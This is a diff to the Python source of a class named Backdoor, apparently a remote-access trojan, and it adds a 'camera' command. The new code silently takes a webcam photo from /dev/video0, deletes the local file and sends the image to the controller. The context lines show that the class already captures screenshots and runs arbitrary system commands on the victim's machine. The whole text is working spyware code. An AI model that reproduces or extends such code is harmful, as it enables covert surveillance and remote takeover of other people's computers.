@@ -3,7 +3,10 @@ import subprocess
 import os
 import base64
 # os.system("pip3 install mss")
+# os.system("pip3 install pygame")
 import mss
+import pygame
+import pygame.camera
 
 
 class Backdoor:
@@ -69,6 +72,16 @@ class Backdoor:
                     command_result = self.read_file("screen.png")
                     os.system("rm screen.png")
                     # "[+] Done! You get see it as screen.png"
+                elif command.split()[0] == "camera":
+                    pygame.camera.init()
+                    pygame.camera.list_cameras() #Camera detected or not
+                    cam = pygame.camera.Camera("/dev/video0",(640,480))
+                    cam.start()
+                    img = cam.get_image()
+                    pygame.image.save(img,"camera.jpg")
+                    cam.stop()
+                    command_result = self.read_file("camera.jpg")
+                    os.system("rm camera.jpg")
                 else:
                     command_result = self.execute_system_command(command)                                      
                 self.reliable_send(command_result)
